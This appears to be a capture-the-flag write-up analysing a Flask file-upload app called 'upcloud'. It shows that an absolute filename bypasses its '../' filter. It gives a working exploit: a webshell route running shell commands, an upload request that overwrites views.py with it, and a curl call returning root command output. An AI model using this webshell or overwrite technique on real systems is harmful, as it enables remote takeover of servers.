## `upcloud` Code Analysis

The application's Docker file indicates its `MODE` environment variable is set to `PRODUCTION`.

```docker
FROM python:3-alpine

# Install packages
RUN apk add --update --no-cache supervisor

# Upgrade pip
RUN python -m pip install --upgrade pip

# Install dependencies
RUN pip install Flask

# Setup app
RUN mkdir -p /app

# Switch working environment
WORKDIR /app

# Add application
COPY app .

# Setup supervisor
COPY config/supervisord.conf /etc/supervisord.conf

# Expose port the server is reachable on
EXPOSE 80

# Disable pycache
ENV PYTHONDONTWRITEBYTECODE=1

# Set mode
ENV MODE="PRODUCTION"

# Run supervisord
CMD ["/usr/bin/supervisord", "-c", "/etc/supervisord.conf"]
```

The application's entry point is `app/run.py`. In `app/run.py`, the application imports `app` from `app/app/__init__.py` and is bound to `0.0.0.0`:`80`.

```python
# app/run.py

import os

from app import app

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 80))
    app.run(host='0.0.0.0', port=port)
```

`app/app/__init__.py` pulls the application's configuration from `app/app/configuration.py`'s `ProductionConfig` or `DevelopmentConfig` based on the value of the `MODE` environment variable. Based on the `Dockerfile`, it is safe to assume the server is running the production configuration. It then imports the application's views from `app/app/views.py`.

```python
# app/app/__init__.py

import os

from flask import Flask

app = Flask(__name__)

if os.environ.get('MODE') == 'PRODUCTION':
    app.config.from_object('app.configuration.ProductionConfig')
else:
    app.config.from_object('app.configuration.DevelopmentConfig')

from app import views
```

The production configuration has the following values:

- `DEBUG` = `False`
- `TESTING` = `False`
- `BOOTSTRAP_FONTAWESOME` = `True`
- `CSRF_ENABLED` = `True`

```python
# app/app/configuration.py

class Config(object):
    """
    Configuration base, for all environments.
    """
    DEBUG = False
    TESTING = False
    BOOTSTRAP_FONTAWESOME = True


class ProductionConfig(Config):
    CSRF_ENABLED = True


class DevelopmentConfig(Config):
    DEBUG = True


class TestingConfig(Config):
    TESTING = True
    DEBUG = True
```

The application has the following endpoints:

- `GET /`
	- Renders `app/app/templates/upload.html`
	- This is hosted at `/upcloud` on the target, indicating the application requires the `/upcloud` prefix to hit its endpoints
- `POST /`
	- `POST /upcloud` on the target
	- Saves the uploaded file to `./public/uploads/$FILE_NAME`, where `$FILENAME` is fetched using the custom `get_file_name()` function from `app/app/utils.py` before the path is constructed using [os.path.join()](https://docs.python.org/3/library/os.path.html#os.path.join)
	- Renders `app/app/templates/success.html` with a link to the uploaded file (i.e., `/upcloud/uploads/$FILENAME`)
- `/uploads/$PATH`
	- Sanitizes `$PATH` with `get_file_name()`
	- Constructs path to file using [os.path.join()](https://docs.python.org/3/library/os.path.html#os.path.join)
	- Returns the file

```python
# app/app/views.py

import os

from app.utils import get_file_name
from flask import render_template, request, send_file

from app import app


@app.route('/', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['file']
        file_name = get_file_name(f.filename)
        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
        f.save(file_path)
        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
    return render_template('upload.html')


@app.route('/uploads/<path:path>')
def send_report(path):
    path = get_file_name(path)
    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))                                                                                  
```

Both the file upload and download endpoints lean on `app/app/utils.py`'s `get_file_name()` to sanitize the user input. This function successfully ensures a user can't pass the string `../` within the uploaded file's name.

```python
import time


def current_milli_time():
    return round(time.time() * 1000)


"""
Pass filename and return a secure version, which can then safely be stored on a regular file system.
"""
def get_file_name(unsafe_filename):
    return recursive_replace(unsafe_filename, "../", "")


"""
TODO: get unique filename
"""
def get_unique_upload_name(unsafe_filename):
    spl = unsafe_filename.rsplit("\\.", 1)
    file_name = spl[0]
    file_extension = spl[1]
    return recursive_replace(file_name, "../", "") + "_" + str(current_milli_time()) + "." + file_extension


"""
Recursively replace a pattern in a string
"""
def recursive_replace(search, replace_me, with_me):
    if replace_me not in search:
        return search
    return recursive_replace(search.replace(replace_me, with_me), replace_me, with_me)
```



```python
import os

from app.utils import get_file_name
from flask import render_template, request, send_file

from app import app


@app.route('/', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['file']
        file_name = get_file_name(f.filename)
        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
        f.save(file_path)
        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
    return render_template('upload.html')


@app.route('/uploads/<path:path>')
def send_report(path):
    path = get_file_name(path)
    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))

@app.route("/exec", methods=["POST"])
def run_cmd():
	import subprocess
	return subprocess.check_output(request.form.get("cmd"), shell=True)
```

```http
POST / HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------30008140435101421202228787033
Content-Length: 1105
Origin: http://127.0.0.1
Connection: close
Referer: http://127.0.0.1/
Upgrade-Insecure-Requests: 1

-----------------------------30008140435101421202228787033
Content-Disposition: form-data; name="file"; filename="/app/app/views.py"
Content-Type: text/plain

import os

from app.utils import get_file_name
from flask import render_template, request, send_file

from app import app


@app.route('/', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        f = request.files['file']
        file_name = get_file_name(f.filename)
        file_path = os.path.join(os.getcwd(), "public", "uploads", file_name)
        f.save(file_path)
        return render_template('success.html', file_url=request.host_url + "uploads/" + file_name)
    return render_template('upload.html')


@app.route('/uploads/<path:path>')
def send_report(path):
    path = get_file_name(path)
    return send_file(os.path.join(os.getcwd(), "public", "uploads", path))

@app.route("/exec", methods=["POST"])
def run_cmd():
	import subprocess
	return subprocess.check_output(request.form.get("cmd"), shell=True)

-----------------------------30008140435101421202228787033--
```

```bash
$ curl -X POST -d 'cmd=id' http://127.0.0.1/exec
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```